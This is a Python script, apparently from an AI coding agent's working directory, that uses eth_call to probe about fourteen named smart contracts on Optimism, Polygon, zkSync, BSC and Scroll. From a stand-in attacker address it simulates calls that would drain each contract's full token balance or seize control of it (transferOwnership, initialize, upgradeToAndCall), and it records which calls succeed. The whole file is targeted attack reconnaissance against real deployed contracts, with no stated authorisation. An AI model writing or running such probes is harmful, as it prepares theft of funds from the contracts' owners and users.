#!/usr/bin/env python3
"""Comprehensive eth_call probe: for each target, call money-path selectors from a
FRESH EOA (0x..dEaD) and record revert/success + revert data. Keyless RPCs. No secrets.
eth_call is read-only: it never mutates state."""
import json, urllib.request, time
RPCS={"op":"https://mainnet.optimism.io","polygon":"https://polygon-bor-rpc.publicnode.com",
 "zksync":"https://mainnet.era.zksync.io","bsc":"https://bsc-dataseed.binance.org",
 "scroll":"https://rpc.scroll.io"}
ATT="0x000000000000000000000000000000000000dEaD"
def rpc(chain,method,params):
    body=json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    req=urllib.request.Request(RPCS[chain],data=body,headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    for _ in range(3):
        try:
            with urllib.request.urlopen(req,timeout=25) as r: return json.loads(r.read())
        except Exception: time.sleep(1)
    return {"error":{"message":"rpc fail"}}
def p(a): return a[2:].lower().rjust(64,"0")
def hx(n): return hex(n)[2:].rjust(64,"0")
def bal(chain,token,who):
    r=rpc(chain,"eth_call",[{"to":token,"data":"0x70a08231"+p(who)},"latest"])
    try: return int(r["result"],16)
    except: return 0
def try_call(chain,to,data,label,out):
    r=rpc(chain,"eth_call",[{"from":ATT,"to":to,"data":data},"latest"])
    if "result" in r:
        out.append({"call":label,"ok":True,"ret":r["result"][:130]})
    else:
        e=r.get("error",{})
        out.append({"call":label,"ok":False,"err":e.get("message","")[:120],"data":str(e.get("data",""))[:140]})

OP_WETH="0x4200000000000000000000000000000000000006"; OP_USDT="0x94b008aA00579c1307B0EF2c499aD98a8ce58e58"; OP_USDC="0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
POL_WPOL="0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270"; POL_WETH="0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619"; POL_USDC="0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
ZK_USDC="0x1d17CBcF0D6D143135aE902365D2E5e2A16538D4"
BSC_USDT="0x55d398326f99059fF775485246999027B3197955"
SCR_WETH="0x5300000000000000000000000000000000000004"; SCR_USDC="0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4"

def addr(sel,*args): return sel+ "".join(args)
def addr_sel(sel, a): return sel+p(a)
def u256_sel(sel, n): return sel+hx(n)
def addr_u256(sel,a,n): return sel+p(a)+hx(n)
def u256_addr(sel,n,a): return sel+hx(n)+p(a)
def u256_addr_addr(sel,n,a,b): return sel+hx(n)+p(a)+p(b)
def addr_u256_addr(sel,a,n,b): return sel+p(a)+hx(n)+p(b)

T={}
T["row22"]=("op","0xc4d4500326981eacD020e20A81b1c479c161c7EF",OP_WETH,lambda c:[
  ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,OP_WETH,"0xc4d4500326981eacD020e20A81b1c479c161c7EF"))),
  ("redeem(1e18,att,att)",u256_addr_addr("0xba087652",10**18,ATT,ATT)),
  ("withdraw(1e18,att,att)",u256_addr_addr("0xb460af94",10**18,ATT,ATT)),
  ("deposit(1e18,att)",u256_addr("0x6e553f65",10**18,ATT)),
  ("mint(1e18,att)",u256_addr("0x94bf804d",10**18,ATT)),
  ("pause()", "0x8456cb59"),
])
T["row18"]=("op","0xA4B6D09c26113F90E7b0B42E76E6FA1959b354b5",OP_WETH,lambda c:[
  ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,OP_WETH,"0xA4B6D09c26113F90E7b0B42E76E6FA1959b354b5"))),
  ("withdraw(WETH,bal,att)",addr_u256_addr("0x69328dec",OP_WETH,bal(c,OP_WETH,"0xA4B6D09c26113F90E7b0B42E76E6FA1959b354b5"),ATT)),
  ("transferOwnership(att)","0xf2fde38b"+p(ATT)),
  ("withdrawFromSubaccount(bal,self)",u256_addr("0x",0,ATT)[:10]+hx(0)+p("0xA4B6D09c26113F90E7b0B42E76E6FA1959b354b5") if False else None),
])
T["row14"]=("polygon","0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4",POL_WPOL,lambda c:[
  ("withdraw(WPOL,bal)",addr_u256("0xf3fef3a3",POL_WPOL,bal(c,POL_WPOL,"0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4"))),
  ("withdraw(WETH,bal)",addr_u256("0xf3fef3a3",POL_WETH,bal(c,POL_WETH,"0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4"))),
  ("withdraw(USDC,bal)",addr_u256("0xf3fef3a3",POL_USDC,bal(c,POL_USDC,"0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4"))),
  ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,POL_WPOL,"0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4"))),
  ("transferOwnership(att)","0xf2fde38b"+p(ATT)),
])
T["row13"]=("op","0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4",OP_WETH,lambda c:[
  ("withdraw(WETH,bal)",addr_u256("0xf3fef3a3",OP_WETH,bal(c,OP_WETH,"0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4"))),
  ("withdraw(USDT,bal)",addr_u256("0xf3fef3a3",OP_USDT,bal(c,OP_USDT,"0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4"))),
  ("withdraw(USDC,bal)",addr_u256("0xf3fef3a3",OP_USDC,bal(c,OP_USDC,"0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4"))),
  ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,OP_WETH,"0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4"))),
  ("transferOwnership(att)","0xf2fde38b"+p(ATT)),
])
T["row16"]=("op","0x3cDbbC3eCa52a65998B021C67982Bc72B2deCef0",OP_WETH,lambda c:[
  ("withdraw(bal)",u256_sel("0x2e1a7d4d",bal(c,OP_WETH,"0x3cDbbC3eCa52a65998B021C67982Bc72B2deCef0"))),
  ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,OP_WETH,"0x3cDbbC3eCa52a65998B021C67982Bc72B2deCef0"))),
  ("deposit(bal)",u256_sel("0xb6b55f25",bal(c,OP_WETH,"0x3cDbbC3eCa52a65998B021C67982Bc72B2deCef0"))),
])
T["row17"]=("op","0xC6Ae1Db6C66d909F7bFEeEb24F9adb8620bf9dbf",OP_USDT,lambda c:[
  ("transfer(USDT,att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,OP_USDT,"0xC6Ae1Db6C66d909F7bFEeEb24F9adb8620bf9dbf"))),
  ("transfer(USDC,att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,OP_USDC,"0xC6Ae1Db6C66d909F7bFEeEb24F9adb8620bf9dbf"))),
  ("transferOwnership(att)","0xf2fde38b"+p(ATT)),
])
T["row19"]=("op","0x6726CA16b1Ba702f58D835cf199672CA04E727eC",OP_WETH,lambda c:[
  ("redeem(1e18)",u256_sel("0xdb006a75",10**18)),
  ("mint(1e18)",u256_sel("0xa0712d68",10**18)),
  ("withdraw(WETH,bal,att)",addr_u256_addr("0x69328dec",OP_WETH,bal(c,OP_WETH,"0x6726CA16b1Ba702f58D835cf199672CA04E727eC"),ATT)),
  ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,OP_WETH,"0x6726CA16b1Ba702f58D835cf199672CA04E727eC"))),
  ("transferOwnership(att)","0xf2fde38b"+p(ATT)),
])
T["row21"]=("polygon","0xB07FfFf3c7DE073c9dA55dcD899fcd4AD8C3050D",POL_WETH,lambda c:[
  ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,POL_WETH,"0xB07FfFf3c7DE073c9dA55dcD899fcd4AD8C3050D"))),
  ("transfer(USDC,att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,POL_USDC,"0xB07FfFf3c7DE073c9dA55dcD899fcd4AD8C3050D"))),
  ("upgradeToAndCall(att,0x)",addr_u256("0x4f1ef286",ATT,0x40)+hx(0)),
  ("initialize(att)","0xc4d66de8"+p(ATT)),
  ("transferOwnership(att)","0xf2fde38b"+p(ATT)),
])
T["row20"]=("zksync","0x7d5b0215EF203D0660BC37d5D09d964fd6b55a1E",ZK_USDC,lambda c:[
  ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,ZK_USDC,"0x7d5b0215EF203D0660BC37d5D09d964fd6b55a1E"))),
  ("transferOwnership(att)","0xf2fde38b"+p(ATT)),
  ("initialize()","0x8129fc1c"),
  ("withdrawFees(att)","0xfd062d3b"+p(ATT)),
])
T["row15"]=("bsc","0x4CA08cD98De12a1Df316da8f93BD0b40146e1589",BSC_USDT,lambda c:[
  ("withdraw(1e18)",u256_sel("0x2e1a7d4d",10**18)),
  ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,BSC_USDT,"0x4CA08cD98De12a1Df316da8f93BD0b40146e1589"))),
  ("initialize(att)","0xc4d66de8"+p(ATT)),
  ("upgradeToAndCall(att,0x)",addr_u256("0x4f1ef286",ATT,0x40)+hx(0)),
])
def scr(chain,proxy,token):
    return lambda c:[
      ("transfer(att,bal)",addr_u256("0xa9059cbb",ATT,bal(c,token,proxy))),
      ("upgradeToAndCall(att,0x)",addr_u256("0x4f1ef286",ATT,0x40)+hx(0)),
      ("upgradeTo(att)","0x3659cfe6"+p(ATT)),
      ("transferOwnership(att)","0xf2fde38b"+p(ATT)),
      ("initialize(att)","0xc4d66de8"+p(ATT)),
      ("withdraw(bal)",u256_sel("0x2e1a7d4d",bal(c,token,proxy))),
    ]
T["scr1"]=("scroll","0x25aB3Efd52e6470681CE037cD546Dc60726948D3",SCR_USDC,scr("scroll","0x25aB3Efd52e6470681CE037cD546Dc60726948D3",SCR_USDC))
T["scr2"]=("scroll","0x740a7C5Ef2F71Edb446F016a3D52a916f8fb2cE7",SCR_WETH,scr("scroll","0x740a7C5Ef2F71Edb446F016a3D52a916f8fb2cE7",SCR_WETH))
T["scr3"]=("scroll","0x7BE980E327692Cf11E793A0d141D534779AF8Ef4",SCR_USDC,scr("scroll","0x7BE980E327692Cf11E793A0d141D534779AF8Ef4",SCR_USDC))
T["scr4"]=("scroll","0x7ba30C4c1089Fa8cC545F6d058cAd3c4172742F2",SCR_WETH,scr("scroll","0x7ba30C4c1089Fa8cC545F6d058cAd3c4172742F2",SCR_WETH))

out={}
for name,(chain,proxy,token,mk) in T.items():
    calls=[(l,d) for (l,d) in mk(chain) if d]
    res=[]
    for l,d in calls:
        try_call(chain,proxy,d,l,res)
    out[name]={"chain":chain,"proxy":proxy,"results":res}
    print(f"== {name} {chain} {proxy}")
    for r in res:
        print("   ",r)
json.dump(out,open("/tmp/opencode/unvtail/ethcall_probe.json","w"),indent=1)
print("saved")
